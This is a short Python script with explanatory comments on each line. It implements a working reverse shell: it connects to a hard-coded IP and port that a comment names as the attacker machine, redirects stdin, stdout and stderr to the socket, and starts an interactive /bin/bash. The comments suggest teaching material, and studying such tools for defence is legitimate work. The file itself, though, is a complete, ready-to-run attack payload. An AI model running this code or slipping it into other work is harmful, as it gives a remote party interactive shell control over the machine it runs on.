#!/usr/bin/env python3

import socket, os, subprocess

s = socket.socket()                                      # create TCP socket; socket.socket() defaults to AF_INET, SOCK_STREAM -  AF_INET stands for IPv4, SOCK_STREAM for TCP;
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Prevent "Address already in use": SOL_SOCKET is the socket layer itself; 1 = enable this option. 
s.connect(("192.168.204.139", 1234))                     # connect the socket to an IP address and a port number of the attacker machine.

# Redirect stdio to socket:
for fd in (0, 1, 2): 
    os.dup2(s.fileno(), fd)                              # os.dup2(oldfd, newfd) duplicates old file descriptors (0 = stdin, 1 = stdout, 2 = stderr) onto newfd.
                                                         # The fileno() method in Python returns the integer file descriptor associated with an open file object. 


subprocess.call(["/bin/bash", "-i"])                    # execute shell


